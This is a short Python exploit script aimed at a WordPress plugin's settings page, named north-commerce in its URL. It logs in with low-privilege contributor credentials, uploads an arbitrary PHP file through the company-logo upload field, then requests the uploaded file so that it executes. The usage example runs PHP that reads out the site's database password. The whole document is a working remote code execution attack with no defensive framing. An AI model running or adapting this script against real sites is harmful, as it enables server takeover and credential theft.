#!/usr/bin/env python3

# Usage
# ./exploit_logo.py http://localhost contributor_user password "<?php echo DB_PASSWORD; ?>"

import sys, requests, pickle

if len(sys.argv) < 5:
    print('Usage: ./exploit_logo.py http://localhost contributor_user password "<?php echo DB_PASSWORD; ?>"')
    exit()

host = sys.argv[1]
username = sys.argv[2]
password = sys.argv[3]
php = sys.argv[4]

# Cookie helpers
def save_cookies(requests_cookiejar, filename):
    with open(filename, 'wb') as f:
        pickle.dump(requests_cookiejar, f)

def load_cookies():
    with open('_cookies', 'rb') as f:
        return pickle.load(f)

## Get login cookies

# Contacts
wp_login = host+'/wp-login.php'
wp_admin = host+'/wp-admin/'

# Attack
with requests.Session() as s:
    headers1 = { 'Cookie':'wordpress_test_cookie=WP Cookie check' }
    datas={
        'log':username, 'pwd':password, 'wp-submit':'Log In',
        'redirect_to':wp_admin, 'testcookie':'1'
    }
    s.post(wp_login, headers=headers1, data=datas)
    resp = s.get(wp_admin)
    #print(resp.text)

    # Save session to file
    save_cookies(s.cookies, '_cookies')


## Exploit
url = host + '/wp-admin/admin.php?page=north-commerce-settings&tab=general'

cookies = load_cookies()

params = {
        'update_settings': 'ooh yeah'
}

files={
    'company-logo-image': ('test.php', php)
}

response = requests.post(url, data=params, cookies=cookies, files=files);
print("status:", response.status_code)
#print(response.text)

# Execute the PHP and display output
res = requests.get(host + '/wp-content/uploads/north-commerce-logo-images/test.php')
print(res.text)

